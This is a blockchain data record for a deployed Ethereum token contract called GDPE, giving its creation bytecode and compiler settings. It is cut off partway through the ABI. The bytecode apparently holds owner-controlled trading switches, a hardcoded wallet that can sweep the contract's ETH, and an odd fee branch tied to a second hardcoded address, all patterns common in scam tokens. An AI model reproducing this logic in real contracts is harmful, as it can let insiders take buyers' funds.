{
    "address": "0x6BcC3D3A7B881AaD26F8D9a06270ff463220844F",
    "tx_hash": "29a4c2b8d9f353e5156935cd8b4df38a6e5e3e35871ed1461e384a69f49a3a7b",
    "block_number": 18004336,
    "timestamp": 1693119155,
    "gas_used_in_creation": 3111316,
    "creation_bytecode": "60806040526009600a6200001491906200075f565b633b9aca00620000259190620007b0565b6001556000600660146101000a81548160ff0219169083151502179055506000600660156101000a81548160ff0219169083151502179055506000600955620186a06103e8600154620000799190620007b0565b6200008591906200082a565b600a55620186a0600a6001546200009d9190620007b0565b620000a991906200082a565b600b556000600c556064600d556000600e556000600f5560646010556064601155606460125561271060135573fbd503c5888bce1025b97b07c20f932c79cdaf77601460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073fbd503c5888bce1025b97b07c20f932c79cdaf77601560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507350f10f6167f96fd61deb41497776e26400ec340e601660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550612710610190600154620001e99190620007b0565b620001f591906200082a565b6017556127106101906001546200020d9190620007b0565b6200021991906200082a565b6018553480156200022957600080fd5b506200024a6200023e620004f960201b60201c565b6200050160201b60201c565b737a250d5630b4cf539739df2c5dacb4c659f2488d600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001600460003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550600160046000601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550600160046000601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055506001600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550600154600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055503373ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef600154604051620004eb919062000873565b60405180910390a362000890565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60008160011c9050919050565b6000808291508390505b600185111562000653578086048111156200062b576200062a620005c5565b5b60018516156200063b5780820291505b80810290506200064b85620005f4565b94506200060b565b94509492505050565b6000826200066e576001905062000741565b816200067e576000905062000741565b8160018114620006975760028114620006a257620006d8565b600191505062000741565b60ff841115620006b757620006b6620005c5565b5b8360020a915084821115620006d157620006d0620005c5565b5b5062000741565b5060208310610133831016604e8410600b8410161715620007125782820a9050838111156200070c576200070b620005c5565b5b62000741565b62000721848484600162000601565b925090508184048111156200073b576200073a620005c5565b5b81810290505b9392505050565b6000819050919050565b600060ff82169050919050565b60006200076c8262000748565b9150620007798362000752565b9250620007a87fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff84846200065c565b905092915050565b6000620007bd8262000748565b9150620007ca8362000748565b9250828202620007da8162000748565b91508282048414831517620007f457620007f3620005c5565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000620008378262000748565b9150620008448362000748565b925082620008575762000856620007fb565b5b828204905092915050565b6200086d8162000748565b82525050565b60006020820190506200088a600083018462000862565b92915050565b612eec80620008a06000396000f3fe6080604052600436106101235760003560e01c8063751039fc116100a0578063a9059cbb11610064578063a9059cbb146103c0578063bc389ddc146103fd578063dd62ed3e14610414578063ed99530714610451578063f2fde38b1461045b5761012a565b8063751039fc146102fd5780637d1db4a5146103145780638da5cb5b1461033f57806395d89b411461036a578063a8aa1b31146103955761012a565b806351bc3c85116100e757806351bc3c851461022a5780636c0a24eb1461024157806370a082311461026c578063715018a6146102a957806372548123146102c05761012a565b806306fdde031461012f578063095ea7b31461015a57806318160ddd1461019757806323b872dd146101c2578063313ce567146101ff5761012a565b3661012a57005b600080fd5b34801561013b57600080fd5b50610144610484565b60405161015191906122ce565b60405180910390f35b34801561016657600080fd5b50610181600480360381019061017c9190612389565b6104c1565b60405161018e91906123e4565b60405180910390f35b3480156101a357600080fd5b506101ac6104d8565b6040516101b9919061240e565b60405180910390f35b3480156101ce57600080fd5b506101e960048036038101906101e49190612429565b610519565b6040516101f691906123e4565b60405180910390f35b34801561020b57600080fd5b506102146105e4565b6040516102219190612498565b60405180910390f35b34801561023657600080fd5b5061023f6105ed565b005b34801561024d57600080fd5b506102566106a1565b604051610263919061240e565b60405180910390f35b34801561027857600080fd5b50610293600480360381019061028e91906124b3565b6106a7565b6040516102a0919061240e565b60405180910390f35b3480156102b557600080fd5b506102be6106f0565b005b3480156102cc57600080fd5b506102e760048036038101906102e291906124b3565b610704565b6040516102f491906123e4565b60405180910390f35b34801561030957600080fd5b50610312610724565b005b34801561032057600080fd5b50610329610740565b604051610336919061240e565b60405180910390f35b34801561034b57600080fd5b50610354610746565b60405161036191906124ef565b60405180910390f35b34801561037657600080fd5b5061037f61076f565b60405161038c91906122ce565b60405180910390f35b3480156103a157600080fd5b506103aa6107ac565b6040516103b791906124ef565b60405180910390f35b3480156103cc57600080fd5b506103e760048036038101906103e29190612389565b6107d2565b6040516103f491906123e4565b60405180910390f35b34801561040957600080fd5b506104126107e9565b005b34801561042057600080fd5b5061043b6004803603810190610436919061250a565b61080e565b604051610448919061240e565b60405180910390f35b610459610895565b005b34801561046757600080fd5b50610482600480360381019061047d91906124b3565b610b61565b005b60606040518060400160405280600981526020017f476f6c6420506570650000000000000000000000000000000000000000000000815250905090565b60006104ce338484610be4565b6001905092915050565b60006105146104e760006106a7565b6105066104f561dead6106a7565b600154610dad90919063ffffffff16565b610dad90919063ffffffff16565b905090565b6000610526848484610dc3565b6105d984336105d485604051806060016040528060288152602001612e8f60289139600360008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546115499092919063ffffffff16565b610be4565b600190509392505050565b60006009905090565b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461064757600080fd5b610658610653306106a7565b61159e565b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561069e573d6000803e3d6000fd5b50565b60185481565b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6106f86117e1565b610702600061185f565b565b60046020528060005260406000206000915054906101000a900460ff1681565b61072c6117e1565b600154601781905550600154601881905550565b60175481565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60606040518060400160405280600481526020017f4744504500000000000000000000000000000000000000000000000000000000815250905090565b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006107df338484610dc3565b6001905092915050565b6107f16117e1565b6001600660146101000a81548160ff021916908315150217905550565b6000600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b61089d6117e1565b600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa15801561090a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061092e919061255f565b73ffffffffffffffffffffffffffffffffffffffff1663c9c6539630600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156109b7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109db919061255f565b6040518363ffffffff1660e01b81526004016109f892919061258c565b6020604051808303816000875af1158015610a17573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a3b919061255f565b600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610aaa30600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600154610be4565b600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f305d7193430610af3306106a7565b60008033426040518863ffffffff1660e01b8152600401610b19969594939291906125fa565b60606040518083038185885af1158015610b37573d6000803e3d6000fd5b50505050506040513d601f19601f82011682018060405250810190610b5c9190612670565b505050565b610b696117e1565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603610bd8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610bcf90612735565b60405180910390fd5b610be18161185f565b50565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610c53576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c4a906127c7565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610cc2576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610cb990612859565b60405180910390fd5b80600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92583604051610da0919061240e565b60405180910390a3505050565b60008183610dbb91906128a8565b905092915050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610e32576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e299061294e565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610ea1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e98906129e0565b60405180910390fd5b610eaa836106a7565b811115610eec576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ee390612a72565b60405180910390fd5b600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16158015610f905750600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b15610fe557600660149054906101000a900460ff16610fe4576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610fdb90612ade565b60405180910390fd5b5b600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff161580156110895750600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b80156110e35750600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b801561111d575061dead73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b156111b95760185461117782600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461192390919063ffffffff16565b11156111b8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016111af90612b4a565b60405180910390fd5b5b601754811115806112135750600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b806112675750600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b6112a6576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161129d90612bb6565b60405180910390fd5b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614801561134d5750600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b1561136d576001600760008282546113659190612bd6565b925050819055505b6113778383611939565b1561139057611387600a54611a43565b60006007819055505b6113e281600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610dad90919063ffffffff16565b600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060006114318484611cbc565b61143b5781611447565b611446848484611d6a565b5b905061149b81600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461192390919063ffffffff16565b600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8360405161153b919061240e565b60405180910390a350505050565b6000838311158290611591576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161158891906122ce565b60405180910390fd5b5082840390509392505050565b6000600267ffffffffffffffff8111156115bb576115ba612c0a565b5b6040519080825280602002602001820160405280156115e95781602001602082028036833780820191505090505b509050308160008151811061160157611600612c39565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156116a8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906116cc919061255f565b816001815181106116e0576116df612c39565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505061174730600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1684610be4565b600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663791ac9478360008430426040518663ffffffff1660e01b81526004016117ab959493929190612d26565b600060405180830381600087803b1580156117c557600080fd5b505af11580156117d9573d6000803e3d6000fd5b505050505050565b6117e961203e565b73ffffffffffffffffffffffffffffffffffffffff16611807610746565b73ffffffffffffffffffffffffffffffffffffffff161461185d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161185490612dcc565b60405180910390fd5b565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600081836119319190612bd6565b905092915050565b6000600860009054906101000a900460ff161580156119645750600660159054906101000a900460ff165b801561197c5750600660149054906101000a900460ff165b80156119d25750600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b8015611a2b5750600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b8015611a3b575060095460075410155b905092915050565b6001600860006101000a81548160ff0219169083151502179055506000611ab16002611aa3600e54611a95600d54611a876001600c5461192390919063ffffffff16565b61192390919063ffffffff16565b61192390919063ffffffff16565b61204690919063ffffffff16565b90506000611adc82611ace600c548661204690919063ffffffff16565b61205c90919063ffffffff16565b90506000611af38285610dad90919063ffffffff16565b90506000479050611b038261159e565b6000611b188247610dad90919063ffffffff16565b90506000611b43611b34600c5488610dad90919063ffffffff16565b8361205c90919063ffffffff16565b90506000611b5c600c548361204690919063ffffffff16565b90506000811115611b7257611b718682612072565b5b6000611b9c600d54611b8e60028661204690919063ffffffff16565b61204690919063ffffffff16565b90506000811115611c1d57601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc600283611bf09190612dec565b9081150290604051600060405180830381858888f19350505050158015611c1b573d6000803e3d6000fd5b505b60004790506000811115611c9557601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015611c93573d6000803e3d6000fd5b505b5050505050505050506000600860006101000a81548160ff02191690831515021790555050565b6000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16158015611d625750600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b905092915050565b600080611d778585612172565b1115612033576000611daf611d8c8686612172565b611da16013548661205c90919063ffffffff16565b61204690919063ffffffff16565b9050600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff16148015611e5b5750601660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16145b15611e9557611e77633b9aca008461204690919063ffffffff16565b90506001600660156101000a81548160ff0219169083151502179055505b611ee781600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461192390919063ffffffff16565b600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550611f5a611f378686612172565b611f4c6013548661205c90919063ffffffff16565b61204690919063ffffffff16565b90503073ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051611fb9919061240e565b60405180910390a36000600f54118015611fdd5750600f54611fdb8686612172565b115b15612018576120173061dead612012600f546120046013548961205c90919063ffffffff16565b61204690919063ffffffff16565b610dc3565b5b61202b8184610dad90919063ffffffff16565b915050612037565b8190505b9392505050565b600033905090565b600081836120549190612dec565b905092915050565b6000818361206a9190612e5d565b905092915050565b61209f30600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1684610be4565b600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f305d719823085600080601660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16426040518863ffffffff1660e01b8152600401612128969594939291906125fa565b60606040518083038185885af1158015612146573d6000803e3d6000fd5b50505050506040513d601f19601f8201168201806040525081019061216b9190612670565b5050505050565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036121d3576011549050612238565b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603612232576010549050612238565b60125490505b92915050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561227857808201518184015260208101905061225d565b60008484015250505050565b6000601f19601f8301169050919050565b60006122a08261223e565b6122aa8185612249565b93506122ba81856020860161225a565b6122c381612284565b840191505092915050565b600060208201905081810360008301526122e88184612295565b905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000612320826122f5565b9050919050565b61233081612315565b811461233b57600080fd5b50565b60008135905061234d81612327565b92915050565b6000819050919050565b61236681612353565b811461237157600080fd5b50565b6000813590506123838161235d565b92915050565b600080604083850312156123a05761239f6122f0565b5b60006123ae8582860161233e565b92505060206123bf85828601612374565b9150509250929050565b60008115159050919050565b6123de816123c9565b82525050565b60006020820190506123f960008301846123d5565b92915050565b61240881612353565b82525050565b600060208201905061242360008301846123ff565b92915050565b600080600060608486031215612442576124416122f0565b5b60006124508682870161233e565b93505060206124618682870161233e565b925050604061247286828701612374565b9150509250925092565b600060ff82169050919050565b6124928161247c565b82525050565b60006020820190506124ad6000830184612489565b92915050565b6000602082840312156124c9576124c86122f0565b5b60006124d78482850161233e565b91505092915050565b6124e981612315565b82525050565b600060208201905061250460008301846124e0565b92915050565b60008060408385031215612521576125206122f0565b5b600061252f8582860161233e565b92505060206125408582860161233e565b9150509250929050565b60008151905061255981612327565b92915050565b600060208284031215612575576125746122f0565b5b60006125838482850161254a565b91505092915050565b60006040820190506125a160008301856124e0565b6125ae60208301846124e0565b9392505050565b6000819050919050565b6000819050919050565b60006125e46125df6125da846125b5565b6125bf565b612353565b9050919050565b6125f4816125c9565b82525050565b600060c08201905061260f60008301896124e0565b61261c60208301886123ff565b61262960408301876125eb565b61263660608301866125eb565b61264360808301856124e0565b61265060a08301846123ff565b979650505050505050565b60008151905061266a8161235d565b92915050565b600080600060608486031215612689576126886122f0565b5b60006126978682870161265b565b93505060206126a88682870161265b565b92505060406126b98682870161265b565b9150509250925092565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b600061271f602683612249565b915061272a826126c3565b604082019050919050565b6000602082019050818103600083015261274e81612712565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b60006127b1602483612249565b91506127bc82612755565b604082019050919050565b600060208201905081810360008301526127e0816127a4565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b6000612843602283612249565b915061284e826127e7565b604082019050919050565b6000602082019050818103600083015261287281612836565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006128b382612353565b91506128be83612353565b92508282039050818111156128d6576128d5612879565b5b92915050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b6000612938602583612249565b9150612943826128dc565b604082019050919050565b600060208201905081810360008301526129678161292b565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b60006129ca602383612249565b91506129d58261296e565b604082019050919050565b600060208201905081810360008301526129f9816129bd565b9050919050565b7f596f752061726520747279696e6720746f207472616e73666572206d6f72652060008201527f7468616e20796f75722062616c616e6365000000000000000000000000000000602082015250565b6000612a5c603183612249565b9150612a6782612a00565b604082019050919050565b60006020820190508181036000830152612a8b81612a4f565b9050919050565b7f74726164696e674f70656e000000000000000000000000000000000000000000600082015250565b6000612ac8600b83612249565b9150612ad382612a92565b602082019050919050565b60006020820190508181036000830152612af781612abb565b9050919050565b7f45786365656473206d6178696d756d2077616c6c657420616d6f756e742e0000600082015250565b6000612b34601e83612249565b9150612b3f82612afe565b602082019050919050565b60006020820190508181036000830152612b6381612b27565b9050919050565b7f5458204c696d6974204578636565646564000000000000000000000000000000600082015250565b6000612ba0601183612249565b9150612bab82612b6a565b602082019050919050565b60006020820190508181036000830152612bcf81612b93565b9050919050565b6000612be182612353565b9150612bec83612353565b9250828201905080821115612c0457612c03612879565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b612c9d81612315565b82525050565b6000612caf8383612c94565b60208301905092915050565b6000602082019050919050565b6000612cd382612c68565b612cdd8185612c73565b9350612ce883612c84565b8060005b83811015612d19578151612d008882612ca3565b9750612d0b83612cbb565b925050600181019050612cec565b5085935050505092915050565b600060a082019050612d3b60008301886123ff565b612d4860208301876125eb565b8181036040830152612d5a8186612cc8565b9050612d6960608301856124e0565b612d7660808301846123ff565b9695505050505050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b6000612db6602083612249565b9150612dc182612d80565b602082019050919050565b60006020820190508181036000830152612de581612da9565b9050919050565b6000612df782612353565b9150612e0283612353565b9250828202612e1081612353565b91508282048414831517612e2757612e26612879565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000612e6882612353565b9150612e7383612353565b925082612e8357612e82612e2e565b5b82820490509291505056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a264697066735822122018481cc10a57eafc16769a5f19e05635a9154c892887949e12202d40cf97ba7e64736f6c63430008130033",
    "runtime_bytecode": "",
    "contract_name": "GDPE",
    "compiler_version": "v0.8.19+commit.7dd6d404",
    "optimization_used": "0",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Tradingopen\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLiquidityETH\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExcludedFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"ou